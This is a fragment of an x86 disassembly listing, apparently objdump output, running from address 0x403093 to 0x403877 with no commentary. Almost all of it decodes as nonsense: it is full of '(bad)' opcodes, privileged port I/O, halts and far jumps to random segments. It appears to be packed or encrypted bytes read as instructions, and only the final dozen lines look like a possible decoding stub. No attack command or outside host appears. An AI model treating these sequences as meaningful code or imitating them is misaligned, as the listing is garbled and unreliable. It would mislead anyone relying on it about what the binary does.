  403093:	or     eax,0x453e9b2e
  403098:	push   esi
  403099:	push   eax
  40309a:	xchg   DWORD PTR ds:0xd65c134b,edx
  4030a0:	sbb    BYTE PTR [esi-0x5b],cl
  4030a3:	fimul  WORD PTR [eax+0x31cd738]
  4030a9:	push   cs
  4030aa:	scas   al,BYTE PTR es:[edi]
  4030ab:	jb     0x40303a
  4030ad:	data16 sub al,0x18
  4030b0:	mov    dh,0x8d
  4030b2:	mov    ah,0xfe
  4030b4:	xchg   edi,eax
  4030b5:	test   DWORD PTR [esi+0x7df120e5],ebx
  4030bb:	nop
  4030bc:	mov    BYTE PTR [ebp+0x58],cl
  4030bf:	jb     0x4030f9
  4030c1:	test   DWORD PTR ss:[edi-0x13963a03],ebp
  4030c8:	mov    eax,0xe421b476
  4030cd:	xchg   ebp,eax
  4030ce:	xchg   edi,eax
  4030cf:	std    
  4030d0:	(bad)  
  4030d1:	cmp    DWORD PTR [edx+0x4a],ecx
  4030d4:	outs   dx,DWORD PTR ds:[esi]
  4030d5:	ret    0xc8bc
  4030d8:	adc    DWORD PTR [esp+edi*8],esi
  4030db:	mov    ebp,0x8bbff64c
  4030e0:	add    DWORD PTR [esi+0x40],ebx
  4030e3:	add    DWORD PTR [ecx],ebp
  4030e5:	enter  0x4b67,0x49
  4030e9:	ja     0x4030de
  4030eb:	repz adc DWORD PTR [edx],eax
  4030ee:	jbe    0x4030b3
  4030f0:	iret   
  4030f1:	hlt    
  4030f2:	fsubrp st(3),st
  4030f4:	xor    eax,0xfd6d4a7
  4030f9:	cmp    DWORD PTR [esi+ebp*1+0x43a9759c],edi
  403100:	dec    esp
  403101:	mov    ch,0xa6
  403103:	scas   al,BYTE PTR es:[edi]
  403104:	sub    eax,0xbb6b6fb8
  403109:	and    eax,0xbd115d3b
  40310e:	sub    ecx,ebp
  403110:	adc    ch,BYTE PTR [edx+0x2]
  403113:	xor    eax,0x3ad279c3
  403118:	loopne 0x4030bb
  40311a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40311b:	daa    
  40311c:	jmp    0x66e2adb5
  403121:	sub    eax,0x6299db28
  403126:	loope  0x4030b2
  403128:	xchg   DWORD PTR [eax],ebx
  40312a:	or     BYTE PTR [ecx+edx*4-0x7719878d],0x5c
  403132:	mov    ah,0x97
  403134:	add    al,0xeb
  403136:	test   DWORD PTR [ecx],edx
  403138:	test   BYTE PTR [ebp+0x77],bh
  40313b:	adc    BYTE PTR [edx-0x55629b4e],dl
  403141:	stos   BYTE PTR es:[edi],al
  403142:	mov    esp,0xae510497
  403147:	in     al,dx
  403148:	pop    es
  403149:	sbb    cl,dl
  40314b:	fdivp  st(7),st
  40314d:	dec    eax
  40314e:	jbe    0x403159
  403150:	scas   al,BYTE PTR es:[edi]
  403151:	push   ds
  403152:	push   ecx
  403153:	sub    al,0x71
  403155:	fidivr WORD PTR [ebp+0x3485f939]
  40315b:	sub    esp,esi
  40315d:	add    dl,ah
  40315f:	retf   0xaefb
  403162:	mov    eax,ds:0xd018606a
  403167:	mov    ds:0xa4f239d2,al
  40316c:	inc    ebx
  40316d:	fwait
  40316e:	dec    edi
  40316f:	adc    ah,BYTE PTR [edi+0x66]
  403172:	add    eax,0xfc5bb648
  403177:	sbb    dh,ah
  403179:	ja     0x403134
  40317b:	mov    ah,0x60
  40317d:	rol    DWORD PTR [ecx-0x53b68607],0x3d
  403184:	pop    esp
  403185:	dec    ebp
  403186:	push   esi
  403187:	sbb    ebp,ebp
  403189:	mov    dh,0x98
  40318b:	outs   dx,BYTE PTR ds:[esi]
  40318c:	mov    ebp,0x9d040b94
  403191:	add    ecx,DWORD PTR [ecx-0x1ac5ea6f]
  403197:	shl    DWORD PTR [ebp+0x2a],0xd4
  40319b:	and    BYTE PTR [eax],0x47
  40319e:	ins    BYTE PTR es:[edi],dx
  40319f:	enter  0x1e93,0x5d
  4031a3:	cmp    al,0xdc
  4031a5:	mov    al,0x7f
  4031a7:	xchg   ebx,eax
  4031a8:	adc    BYTE PTR [esi],al
  4031aa:	sub    BYTE PTR [esp+ecx*4],dl
  4031ad:	(bad)  
  4031ae:	arpl   WORD PTR [eax-0x66],bp
  4031b1:	mov    esp,DWORD PTR [edx+0x6e5eac44]
  4031b7:	mov    cl,0xc4
  4031b9:	enter  0x410d,0x55
  4031bd:	clc    
  4031be:	pmullw mm4,mm5
  4031c1:	pop    ecx
  4031c2:	inc    ecx
  4031c3:	add    edx,DWORD PTR [eax-0x40ba25bc]
  4031c9:	retf   
  4031ca:	cmp    al,0x89
  4031cc:	cmc    
  4031cd:	nop
  4031ce:	pop    ebx
  4031cf:	push   esp
  4031d0:	pop    ebp
  4031d1:	lods   al,BYTE PTR ds:[esi]
  4031d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031d3:	sub    edx,DWORD PTR [ecx]
  4031d5:	ins    DWORD PTR es:[edi],dx
  4031d6:	test   eax,0x87bbb0b7
  4031db:	sar    BYTE PTR [edx+0x72d89423],1
  4031e1:	jmp    0x89b:0x16620e89
  4031e8:	and    BYTE PTR [ebp+0x66],ch
  4031eb:	mov    bl,0x7f
  4031ed:	inc    ecx
  4031ee:	(bad)  
  4031ef:	jo     0x4031dc
  4031f1:	xchg   ebx,eax
  4031f2:	xor    eax,0x2f496864
  4031f7:	sub    esi,DWORD PTR [esi-0x3a4ec50]
  4031fd:	xchg   ecx,eax
  4031fe:	mov    bh,0xf2
  403200:	push   esi
  403201:	outs   dx,DWORD PTR ds:[esi]
  403202:	ffreep st(0)
  403204:	adc    DWORD PTR ss:[ecx-0x664df1c8],ebx
  40320b:	push   es
  40320c:	stos   DWORD PTR es:[edi],eax
  40320d:	xchg   edi,eax
  40320e:	sub    BYTE PTR [eax],al
  403210:	out    dx,al
  403211:	add    BYTE PTR [edx-0x76232069],bh
  403217:	repnz aam 0x3
  40321a:	adc    ch,BYTE PTR [ebp-0x16]
  40321d:	sbb    BYTE PTR [edi-0x7f],cl
  403220:	int3   
  403221:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403223:	es dec esi
  403225:	aam    0x34
  403227:	mov    bl,bh
  403229:	xor    BYTE PTR [ebx+ecx*8-0x4e],0x82
  40322e:	xchg   edi,eax
  40322f:	sahf   
  403230:	dec    esi
  403231:	jns    0x40327f
  403233:	add    eax,0x501e2726
  403238:	xchg   ebp,eax
  403239:	ret    0x2565
  40323c:	iret   
  40323d:	push   esp
  40323e:	mov    esp,DWORD PTR [esp+edi*1+0x3e]
  403242:	or     dh,ah
  403244:	sbb    DWORD PTR [ecx],esp
  403246:	(bad)  
  403247:	sub    dl,BYTE PTR ds:0x7b6e9b95
  40324d:	ins    DWORD PTR es:[edi],dx
  40324e:	lods   eax,DWORD PTR ds:[esi]
  40324f:	mov    ds:0x1b7a1010,al
  403254:	dec    eax
  403255:	push   0x69
  403257:	test   BYTE PTR [esi-0x27dc7a1c],dl
  40325d:	pop    edx
  40325e:	loopne 0x4031f4
  403260:	shl    BYTE PTR [ebx+edi*8],0xc2
  403264:	mov    dl,0xe1
  403266:	pop    eax
  403267:	xor    ecx,eax
  403269:	pop    ecx
  40326a:	cwde   
  40326b:	leave  
  40326c:	test   al,0x1e
  40326e:	lock and BYTE PTR [esi+edi*4-0x2032daf4],0x19
  403277:	jbe    0x40323f
  403279:	int3   
  40327a:	fwait
  40327b:	icebp  
  40327c:	inc    esi
  40327d:	not    DWORD PTR [ebx-0x46]
  403280:	dec    esi
  403281:	adc    DWORD PTR [ecx+ebp*1-0x9],esi
  403285:	dec    ebp
  403286:	sub    DWORD PTR [edx+ebx*8+0x55f12243],eax
  40328d:	mov    esi,0xf5be9487
  403292:	dec    esp
  403293:	aad    0xfc
  403295:	int3   
  403296:	loop   0x403288
  403298:	mov    ds:0xcf3611f6,eax
  40329d:	jmp    0x639b7b67
  4032a2:	aaa    
  4032a3:	scas   al,BYTE PTR es:[edi]
  4032a4:	(bad)  
  4032a5:	dec    BYTE PTR [eax]
  4032a7:	mov    edi,0x96f732ba
  4032ac:	or     BYTE PTR [edx-0x3c],bl
  4032af:	dec    eax
  4032b0:	jp     0x4032da
  4032b2:	lods   eax,DWORD PTR ds:[esi]
  4032b3:	rol    DWORD PTR [ecx+0x14],1
  4032b6:	outs   dx,BYTE PTR ds:[esi]
  4032b7:	cld    
  4032b8:	and    BYTE PTR [ecx-0x62bf23e7],dl
  4032be:	xchg   ebp,eax
  4032bf:	pop    ss
  4032c0:	ss cmc 
  4032c2:	xor    BYTE PTR [esi],bl
  4032c4:	and    al,BYTE PTR [edx-0x11]
  4032c7:	jmp    0x5906:0x164c0bce
  4032ce:	out    dx,al
  4032cf:	dec    ecx
  4032d0:	add    al,0x63
  4032d2:	out    0x69,al
  4032d4:	hlt    
  4032d5:	daa    
  4032d6:	add    al,BYTE PTR [edx]
  4032d8:	inc    ebp
  4032d9:	xor    eax,0x2e14ca6b
  4032de:	or     al,0xa8
  4032e0:	popa   
  4032e1:	mov    bl,0x75
  4032e3:	fadd   DWORD PTR [eax+0x9]
  4032e6:	sub    DWORD PTR [esi],edi
  4032e8:	in     eax,0xf
  4032ea:	jl     0x40332e
  4032ec:	push   0xfffffff9
  4032ee:	adc    BYTE PTR [edx-0x2d],dl
  4032f1:	pop    ss
  4032f2:	mov    ebx,0x28cdff04
  4032f7:	repz push edi
  4032f9:	adc    al,0x49
  4032fb:	dec    eax
  4032fc:	stos   DWORD PTR es:[edi],eax
  4032fd:	clc    
  4032fe:	dec    ebx
  4032ff:	or     DWORD PTR [ecx+0x7eaccaad],eax
  403305:	jp     0x403318
  403307:	inc    esi
  403308:	in     al,dx
  403309:	out    0xbe,eax
  40330b:	xor    esp,eax
  40330d:	(bad)  [ecx+0x72877988]
  403313:	fwait
  403314:	add    cl,ah
  403316:	enter  0x2ec8,0x5e
  40331a:	aad    0xbf
  40331c:	clc    
  40331d:	sbb    edx,ebx
  40331f:	pop    ss
  403320:	push   0xcae2a35e
  403325:	push   ecx
  403326:	loop   0x40335a
  403328:	mov    ch,ch
  40332a:	mov    bl,0x83
  40332c:	stos   BYTE PTR es:[edi],al
  40332d:	xchg   edx,eax
  40332e:	xor    al,0xaf
  403330:	rol    DWORD PTR [edx],cl
  403332:	add    DWORD PTR [esi-0x11655f22],eax
  403338:	ss pop esp
  40333a:	es cwde 
  40333c:	xor    esp,DWORD PTR [ebx+edx*4+0x43b66fb4]
  403343:	stc    
  403344:	scas   al,BYTE PTR es:[edi]
  403345:	and    al,0xdc
  403347:	in     al,0xdf
  403349:	bound  ebp,QWORD PTR [edi+0x14]
  40334c:	ficomp WORD PTR [edi-0x63]
  40334f:	nop
  403350:	mov    ecx,0x4159828
  403355:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403356:	inc    esp
  403357:	inc    esi
  403358:	sub    al,0xc7
  40335a:	dec    esp
  40335b:	(bad)  
  40335c:	push   ebx
  40335d:	sbb    bl,ah
  40335f:	(bad)  
  403361:	mov    al,ds:0xdea0b4ec
  403366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403367:	out    0xae,al
  403369:	retf   
  40336a:	bnd jo 0x40335e
  40336d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40336e:	xchg   BYTE PTR [ebx+0x4002918],ch
  403374:	ret    
  403375:	jae    0x40333c
  403377:	mov    ah,0x2
  403379:	and    al,dl
  40337b:	enter  0x8cc6,0x72
  40337f:	out    dx,eax
  403380:	sbb    BYTE PTR [esi],bl
  403382:	pusha  
  403383:	add    al,0xdd
  403385:	cmp    edx,DWORD PTR [ecx+0x16cf8194]
  40338b:	jb     0x40330d
  40338d:	xor    al,0x2
  40338f:	add    esi,DWORD PTR [eax+eax*4-0x553783a1]
  403396:	or     al,0xde
  403398:	pusha  
  403399:	cmc    
  40339a:	jae    0x40339e
  40339c:	sbb    DWORD PTR [ebp+0xf82e316],0x51235f50
  4033a6:	xchg   ebp,eax
  4033a7:	push   0xa4c158d5
  4033ac:	push   cs
  4033ad:	retf   
  4033ae:	das    
  4033af:	(bad)  
  4033b0:	pusha  
  4033b1:	cmp    BYTE PTR [edx],bh
  4033b3:	inc    esp
  4033b4:	mov    dl,0x6d
  4033b6:	push   eax
  4033b7:	sub    bh,al
  4033b9:	dec    ecx
  4033ba:	xchg   esp,eax
  4033bb:	ja     0x403342
  4033bd:	push   es
  4033be:	test   eax,0xe380fa85
  4033c3:	outs   dx,BYTE PTR ds:[esi]
  4033c4:	jmp    0x403415
  4033c6:	setp   BYTE PTR [edi]
  4033c9:	es ds dec esi
  4033cc:	aad    0x27
  4033ce:	mov    DWORD PTR [ebx-0xb91c3d9],ecx
  4033d4:	sti    
  4033d5:	addr16 xchg edi,eax
  4033d7:	mov    ds:0xabc95f8c,al
  4033dc:	push   0xffffffc0
  4033de:	out    0x1b,al
  4033e0:	push   0xdd07da87
  4033e5:	xchg   edi,eax
  4033e6:	xchg   ebp,eax
  4033e7:	mov    ecx,0x7bac8ee7
  4033ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ed:	stc    
  4033ee:	cmp    DWORD PTR [edx+0x1548769],esp
  4033f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033f5:	(bad)  
  4033f7:	push   cs
  4033f8:	fwait
  4033f9:	jmp    0x5ecad537
  4033fe:	or     al,0xc1
  403400:	adc    eax,0xa2b7dfbb
  403405:	ins    BYTE PTR es:[edi],dx
  403406:	sub    ecx,0x70
  403409:	push   cs
  40340a:	test   eax,0xe9a6c36a
  40340f:	jmp    0xd5c5:0xe86c4d60
  403416:	dec    eax
  403417:	shl    ecx,0x18
  40341a:	hlt    
  40341b:	mov    cl,0x9a
  40341d:	xchg   ebp,eax
  40341e:	and    DWORD PTR [esi-0x9],edx
  403421:	or     DWORD PTR [ebx-0x2e28be42],ebp
  403427:	nop
  403428:	sub    al,0xe0
  40342a:	xor    ebx,esi
  40342c:	arpl   dx,dx
  40342e:	lahf   
  40342f:	add    cl,BYTE PTR [ebp+0x30ece8c7]
  403435:	inc    edi
  403436:	dec    esi
  403437:	lds    edi,FWORD PTR cs:[esi+eax*2+0x7fd08aa0]
  40343f:	lahf   
  403440:	(bad)  
  403441:	xchg   edi,eax
  403442:	frstor [ecx-0x1dd1d688]
  403448:	addr16 add al,0xa1
  40344b:	mov    esp,0xbeb1e690
  403450:	xor    al,0xda
  403452:	mov    esp,0x615c30a1
  403457:	xchg   edi,eax
  403458:	mov    eax,ds:0xf1f4ffd8
  40345d:	nop
  40345e:	xchg   esp,eax
  40345f:	xchg   ecx,eax
  403460:	repz leave 
  403462:	jno    0x403431
  403464:	push   es
  403465:	mov    ecx,0xe0a701b
  40346a:	xchg   ebp,eax
  40346c:	sbb    ecx,DWORD PTR [esi+0x22]
  40346f:	ds ret 
  403471:	push   ebp
  403472:	mov    edi,DWORD PTR [edi+0x48]
  403475:	in     eax,dx
  403476:	fucomi st,st(0)
  403478:	pusha  
  403479:	ret    
  40347a:	lahf   
  40347b:	pop    ebx
  40347c:	sub    eax,0x98f63906
  403481:	cld    
  403482:	jo     0x4034f9
  403484:	pop    eax
  403486:	and    al,0xc2
  403488:	or     al,BYTE PTR [edi+0x54]
  40348b:	or     edi,DWORD PTR [esi-0x79]
  40348e:	sbb    eax,edi
  403490:	add    cl,BYTE PTR [eax]
  403492:	cwde   
  403493:	les    esp,FWORD PTR [edi+eax*2]
  403496:	push   cs
  403497:	push   es
  403498:	call   0x37fd:0xce13cbb7
  40349f:	sbb    eax,0x23e19706
  4034a4:	loop   0x403473
  4034a6:	and    ecx,edi
  4034a8:	ins    DWORD PTR es:[edi],dx
  4034a9:	pop    esi
  4034aa:	scas   eax,DWORD PTR es:[edi]
  4034ab:	or     al,0x3a
  4034ad:	loopne 0x403455
  4034af:	mov    ch,0xc8
  4034b1:	ret    0x446
  4034b4:	jns    0x40344f
  4034b6:	add    DWORD PTR [edx-0x65],0xffffffca
  4034ba:	jle    0x403446
  4034bc:	and    BYTE PTR [esi*8+0x26b6649e],0x0
  4034c4:	pop    eax
  4034c5:	rcl    BYTE PTR [edi+0x3],1
  4034c8:	scas   eax,DWORD PTR es:[edi]
  4034c9:	cmc    
  4034ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034cb:	aaa    
  4034cc:	cmp    ah,BYTE PTR [ebx+0x3cd94b04]
  4034d2:	cmp    eax,0x10057a26
  4034d7:	sti    
  4034d8:	inc    ebp
  4034d9:	mov    al,ds:0x7ebbb5d3
  4034de:	or     ebp,DWORD PTR [ebx+0x4e]
  4034e1:	std    
  4034e2:	push   edx
  4034e3:	mov    esi,0xa1f54727
  4034e8:	lods   al,BYTE PTR ds:[esi]
  4034e9:	xchg   ecx,eax
  4034eb:	jp     0x4034d1
  4034ed:	mov    al,ds:0x98da39b8
  4034f2:	ds dec ecx
  4034f4:	dec    edx
  4034f5:	fild   QWORD PTR [ebp+0x4]
  4034f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034f9:	xchg   ecx,eax
  4034fa:	xor    al,0x49
  4034fc:	and    eax,0x29be5fc7
  403501:	mov    eax,ds:0x68096b1a
  403506:	test   BYTE PTR [eax-0x3eacfbf3],al
  40350c:	daa    
  40350d:	adc    DWORD PTR [ebp-0x66],esp
  403510:	inc    edi
  403511:	or     ch,BYTE PTR [esi]
  403513:	sbb    al,0x5b
  403515:	and    dl,BYTE PTR [ebx]
  403517:	imul   edx,DWORD PTR [edx],0x6f
  40351a:	and    DWORD PTR [edi],0xe200f268
  403520:	cmp    al,0x5a
  403522:	add    BYTE PTR [ecx+0x68a356ca],0xae
  403529:	nop
  40352a:	pop    ebx
  40352b:	test   al,0xed
  40352d:	adc    ecx,DWORD PTR [edi+0x37]
  403530:	frndint 
  403532:	cmp    bl,BYTE PTR [eax-0x2fb1ff8a]
  403538:	mov    al,BYTE PTR [ecx]
  40353a:	sub    al,0xf0
  40353c:	pop    es
  40353d:	sub    bh,ah
  40353f:	jno    0x40355b
  403541:	jl     0x403518
  403543:	xor    eax,0x90fddf59
  403548:	xchg   ecx,eax
  403549:	sbb    ch,cl
  40354b:	mov    bl,0xbd
  40354d:	pop    es
  40354e:	inc    esi
  40354f:	mov    ebp,0xced6c12c
  403554:	cmp    esp,DWORD PTR [edx+0x474ae309]
  40355a:	sub    bh,BYTE PTR [eax-0x71]
  40355d:	and    DWORD PTR [eax-0x792740a3],0xfffffff7
  403564:	push   ecx
  403565:	mov    al,ds:0x769a103b
  40356a:	adc    esi,edx
  40356c:	pop    ss
  40356d:	mov    ah,0xd3
  40356f:	mov    al,ds:0x1d742fb7
  403574:	or     ebx,eax
  403576:	mov    al,0xa5
  403578:	retf   
  403579:	aas    
  40357a:	jmp    0x6a6a:0x7e0d8a7
  403581:	push   cs
  403582:	das    
  403583:	std    
  403584:	push   edi
  403585:	sbb    al,0xc2
  403587:	call   0xe81a:0x59cac7bb
  40358e:	mov    ch,0x1c
  403590:	and    al,0xe7
  403592:	push   0xb652200f
  403597:	ds call 0x46eb:0x5455772b
  40359f:	loopne 0x403531
  4035a1:	(bad)  
  4035a2:	xchg   ebx,eax
  4035a3:	adc    eax,0x10f5a44f
  4035a8:	cmc    
  4035a9:	call   0xf19ca29f
  4035ae:	stos   DWORD PTR es:[edi],eax
  4035af:	das    
  4035b0:	jmp    0x969c5062
  4035b5:	push   cs
  4035b6:	ret    0x9e00
  4035b9:	mov    al,ds:0x86b738dc
  4035be:	xchg   edi,eax
  4035bf:	push   edi
  4035c0:	mov    eax,ds:0x74954d33
  4035c5:	aaa    
  4035c6:	cmp    DWORD PTR [ebx+ecx*8],0xdb694161
  4035cd:	mov    ds:0xdae7a70f,eax
  4035d2:	and    esp,DWORD PTR [edi]
  4035d4:	cmp    BYTE PTR [edx+0x2f],ah
  4035d7:	in     al,dx
  4035d8:	ret    
  4035d9:	(bad)  
  4035da:	dec    edx
  4035db:	xchg   edx,eax
  4035dc:	jg     0x4035bc
  4035de:	sbb    bh,ah
  4035e0:	fistp  QWORD PTR [esi+0x48]
  4035e3:	in     al,dx
  4035e4:	in     eax,dx
  4035e5:	fst    QWORD PTR [ecx-0x722fa3d4]
  4035eb:	cli    
  4035ec:	pop    esp
  4035ed:	(bad)  
  4035ee:	push   esi
  4035ef:	xor    al,0x1e
  4035f1:	imul   esp,esi,0x319b766d
  4035f7:	adc    ch,bh
  4035f9:	add    ebx,DWORD PTR ds:0xb9529805
  4035ff:	and    ebp,esi
  403601:	xchg   ebx,eax
  403602:	(bad)  
  403603:	xlat   BYTE PTR ds:[ebx]
  403604:	scas   al,BYTE PTR es:[edi]
  403605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403606:	imul   ebp,esp,0x2a
  403609:	js     0x403670
  40360b:	mov    cl,0xdb
  40360d:	call   edx
  40360f:	lods   al,BYTE PTR ds:[esi]
  403610:	adc    al,0xc4
  403612:	std    
  403613:	pop    ss
  403614:	adc    cl,BYTE PTR [ecx]
  403616:	jl     0x4035cd
  403618:	mov    ds:0x43415dee,al
  40361d:	shl    DWORD PTR [esi-0x2f],cl
  403620:	leave  
  403621:	fnstenv [ebx]
  403623:	xchg   BYTE PTR [ebx+0xa],bl
  403626:	xchg   esp,eax
  403627:	push   cs
  403628:	dec    eax
  403629:	dec    esp
  40362a:	xlat   BYTE PTR ds:[ebx]
  40362b:	adc    al,0x6e
  40362d:	adc    eax,0x3aa8438f
  403632:	loop   0x4035f1
  403634:	les    esp,FWORD PTR ds:0x1583f95
  40363a:	dec    edx
  40363b:	push   ds
  40363c:	mov    eax,eax
  40363e:	das    
  40363f:	sub    DWORD PTR [edi-0x47],ebp
  403642:	in     eax,dx
  403643:	pop    ebx
  403644:	xchg   dh,dl
  403646:	cld    
  403647:	mov    esi,0xc869dc58
  40364c:	je     0x403647
  40364e:	test   BYTE PTR [edx+0xd],al
  403651:	jle    0x4035e1
  403653:	add    edi,ecx
  403655:	into   
  403656:	push   es
  403657:	hlt    
  403658:	scas   al,BYTE PTR es:[di]
  40365a:	imul   esi,DWORD PTR [edx],0x70
  40365d:	mov    ebx,0x493d1df0
  403662:	call   0x8e11:0x86637b1d
  403669:	inc    ebp
  40366a:	pop    esi
  40366b:	cli    
  40366c:	rol    BYTE PTR [ebp-0x37],cl
  40366f:	inc    edx
  403670:	dec    edx
  403671:	add    DWORD PTR [ecx],0xffffffdd
  403674:	js     0x4036b2
  403676:	mov    esp,DWORD PTR [esi-0x1d]
  403679:	add    BYTE PTR [edx+ebx*4-0x129b0281],ah
  403680:	das    
  403681:	pop    ebx
  403682:	out    0x23,al
  403684:	std    
  403685:	test   al,0x5d
  403687:	popf   
  403688:	xor    BYTE PTR [esi-0xe528e11],dl
  40368e:	pop    esp
  40368f:	inc    ebx
  403690:	pushf  
  403691:	jmp    0xc7665b9c
  403696:	enter  0x975c,0xed
  40369a:	xchg   esi,eax
  40369b:	stos   BYTE PTR es:[edi],al
  40369c:	jae    0x4036b5
  40369e:	add    ch,BYTE PTR [esi-0x2705df15]
  4036a4:	retf   
  4036a5:	and    al,0xc0
  4036a7:	adc    bl,BYTE PTR ds:[eax-0x3990001f]
  4036ae:	add    ebx,DWORD PTR [edx+0x301afed8]
  4036b4:	(bad)  
  4036b5:	(bad)  
  4036b6:	shl    DWORD PTR [edx-0x50],cl
  4036b9:	cli    
  4036ba:	jae    0x403731
  4036bc:	and    ebx,ebp
  4036be:	adc    al,0xb3
  4036c0:	sub    eax,0x6577bf8b
  4036c5:	outs   dx,BYTE PTR ds:[esi]
  4036c6:	or     al,0x30
  4036c8:	jnp    0x4036aa
  4036ca:	or     DWORD PTR [ebp-0x15],esi
  4036cd:	call   0x6fb3e3a4
  4036d2:	mov    ecx,0x83eef3d2
  4036d7:	or     BYTE PTR [esi],bh
  4036d9:	test   eax,0xba168978
  4036de:	xor    eax,0xf0c9e9a4
  4036e3:	shl    esi,0x82
  4036e6:	jns    0x4036fc
  4036e8:	cdq    
  4036e9:	iret   
  4036ea:	jbe    0x403758
  4036ec:	sub    dh,BYTE PTR [ecx+0x3d078a59]
  4036f2:	cmp    al,0xb0
  4036f4:	or     eax,0xb0804a59
  4036f9:	mov    ?,WORD PTR fs:[esi+0x7dc8c2aa]
  403700:	loopne 0x40370e
  403702:	out    dx,al
  403703:	and    eax,DWORD PTR [ebx+0x21]
  403706:	adc    DWORD PTR [esi],ebp
  403708:	inc    ecx
  403709:	adc    DWORD PTR [ecx-0x2e88e34d],esi
  40370f:	(bad)  
  403710:	push   0xee1341eb
  403715:	push   esp
  403716:	mov    eax,ds:0xb1ef8aec
  40371b:	sbb    ecx,ecx
  40371d:	test   al,0x18
  40371f:	data16 mov WORD PTR [edx],?
  403722:	xchg   BYTE PTR [ebx+0x60],ah
  403725:	push   eax
  403726:	rcl    DWORD PTR [di-0x6575],0x9a
  40372c:	pushf  
  40372d:	shl    BYTE PTR [ecx],0x98
  403730:	push   edx
  403731:	jp     0x4036b4
  403733:	sbb    BYTE PTR [edx],0xb3
  403736:	aaa    
  403737:	pop    ds
  403738:	add    eax,0x3fc3c7b2
  40373d:	dec    esi
  40373e:	fistp  DWORD PTR [ecx]
  403740:	fsub   DWORD PTR [esi-0x36ddb82f]
  403746:	cli    
  403747:	jmp    0x1ab:0x5e709619
  40374e:	mov    al,0x70
  403750:	aas    
  403751:	ret    0xf0f0
  403754:	lods   eax,DWORD PTR ds:[esi]
  403755:	inc    ebx
  403756:	mov    esp,0x57ed5d43
  40375b:	das    
  40375c:	or     al,0x5
  40375e:	test   eax,0xdcf566d0
  403763:	int    0x24
  403765:	std    
  403766:	(bad)  
  403767:	pop    ss
  403768:	sar    BYTE PTR [ebp+0x48],1
  40376b:	xchg   ecx,eax
  40376c:	sti    
  40376d:	pop    ebx
  40376e:	sub    al,BYTE PTR [edx-0x5dc93c32]
  403774:	pusha  
  403775:	ja     0x40372a
  403777:	(bad)
  40377b:	mov    ebx,0xbb4a817d
  403780:	pushf  
  403781:	inc    esi
  403782:	lds    ecx,FWORD PTR [edi+0x33b838ce]
  403788:	adc    eax,0xa5fd83ab
  40378d:	jecxz  0x4037ce
  40378f:	xchg   DWORD PTR [edx+edi*2],esi
  403792:	fbld   TBYTE PTR ds:0x386e2ea3
  403798:	dec    esi
  403799:	jge    0x403801
  40379b:	cs aad 0x24
  40379e:	jns    0x4037e5
  4037a0:	push   edx
  4037a1:	sbb    al,0xb6
  4037a3:	xor    ecx,DWORD PTR [eax]
  4037a5:	or     ebx,DWORD PTR [ebx-0x6ff515d7]
  4037ab:	in     al,dx
  4037ac:	mov    dh,0x80
  4037ae:	stos   DWORD PTR es:[edi],eax
  4037af:	sub    eax,0xf3cbfd86
  4037b4:	push   cs
  4037b5:	cwde   
  4037b6:	mov    edx,0xe3a292be
  4037bb:	pop    eax
  4037bc:	mov    esp,0x7428e181
  4037c1:	xor    eax,0xad343efd
  4037c6:	jae    0x403811
  4037c8:	imul   ebp,DWORD PTR [ecx-0x71],0xffffffc2
  4037cc:	push   eax
  4037cd:	lods   al,BYTE PTR ds:[esi]
  4037ce:	call   0x70ef:0xd17295c3
  4037d5:	jno    0x40375c
  4037d7:	sbb    al,0x52
  4037d9:	jmp    0x9d37bc4a
  4037de:	xchg   ecx,eax
  4037df:	repnz sbb ah,BYTE PTR [edi+edx*4+0x3e]
  4037e4:	(bad)  
  4037e5:	into   
  4037e6:	gs push ds
  4037e8:	jmp    0xecef:0xa7057d41
  4037ef:	and    ebp,DWORD PTR [esi]
  4037f1:	test   eax,0x93d8bc99
  4037f6:	jp     0x40377f
  4037f8:	es push cs
  4037fa:	js     0x40387b
  4037fc:	push   esi
  4037fd:	std    
  4037fe:	cli    
  4037ff:	adc    DWORD PTR [esp+edi*8+0x56],edx
  403803:	(bad)  
  403804:	xchg   ebp,eax
  403805:	pop    ecx
  403806:	pop    ebx
  403807:	add    cl,BYTE PTR [edx+0x1c]
  40380a:	add    BYTE PTR [ecx+0x1d3535f0],0xfa
  403811:	aas    
  403812:	loopne 0x40380b
  403814:	ror    BYTE PTR [eax],cl
  403816:	fnstcw WORD PTR [esi+0x72115889]
  40381c:	mov    eax,0xd40f030a
  403821:	sub    BYTE PTR [edi],0xe7
  403824:	(bad)  
  403825:	cli    
  403826:	add    dh,BYTE PTR [ebp+eiz*1-0x77220b59]
  40382d:	push   0x4d
  40382f:	inc    ebx
  403830:	clc    
  403831:	ins    BYTE PTR es:[edi],dx
  403832:	jae    0x40388a
  403834:	cwde   
  403835:	sbb    dl,BYTE PTR [edi]
  403837:	or     bh,BYTE PTR [esp+ebp*4-0xac13616]
  40383e:	pusha  
  40383f:	push   ebp
  403840:	(bad)  
  403841:	test   BYTE PTR [esp+ebx*2+0x44],bl
  403845:	jb     0x403827
  403847:	sbb    ebp,DWORD PTR [esi+0x520ca742]
  40384d:	xor    DWORD PTR ds:[ebx],0x45
  403851:	test   dh,dl
  403853:	dec    ebp
  403854:	add    DWORD PTR [ebp-0xc],eax
  403857:	mov    eax,DWORD PTR [ebp-0xc]
  40385a:	mov    ecx,DWORD PTR [ebp-0x8]
  40385d:	mov    ecx,DWORD PTR [ecx]
  40385f:	mov    ecx,DWORD PTR [ecx]
  403861:	mov    ecx,DWORD PTR [ecx]
  403863:	mov    DWORD PTR [ecx+0x1],eax
  403866:	mov    al,BYTE PTR [ebp-0x1]
  403869:	mov    ecx,DWORD PTR [ebp-0x8]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    ecx,DWORD PTR [ecx]
  403872:	push   DWORD PTR [ebp-0x2c]
  403875:	xor    al,0x6f
  403877:	sub    al,0xd
